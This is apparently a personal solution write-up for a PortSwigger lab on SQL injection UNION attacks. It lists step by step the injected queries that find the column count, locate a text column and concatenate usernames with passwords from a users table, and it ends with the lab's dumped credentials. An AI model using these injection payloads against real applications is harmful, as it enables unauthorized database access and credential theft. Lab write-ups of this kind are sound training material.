--Name: SQL injection UNION attack, retrieving multiple values in a single column
--URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
--Level:Medium Time: 7 min
---------------------------------------------------------------------------------

-- Objective: Get user data and login as adminstrator

SELECT * FROM products WHERE category = 'Pets'-- ???
SELECT * FROM products WHERE category = 'Pets' ORDER BY 1-- ???     OK
SELECT * FROM products WHERE category = 'Pets' ORDER BY 2-- ???     OK
SELECT * FROM products WHERE category = 'Pets' ORDER BY 3-- ???     Error


SELECT ?, ? FROM products WHERE category = 'Pets' UNION SELECT NULL, NULL-- ???    OK 
SELECT ?, ? FROM products WHERE category = 'Pets' UNION SELECT 's', NULL--  ???    Error
SELECT ?, ? FROM products WHERE category = 'Pets' UNION SELECT NULL, 's'--  ???    OK

SELECT ?, ? FROM products WHERE category = 'Pets' UNION SELECT NULL, Username || ' - ' || Password FROM users-- ???     Solved
--   #  |  Useer - Password
-----------------------------
-- data1: administrator - doypqk5po0efy97fg4lq
-----------------------------
-- data2: wiener - cz43zii9f0tg5g42viav
-----------------------------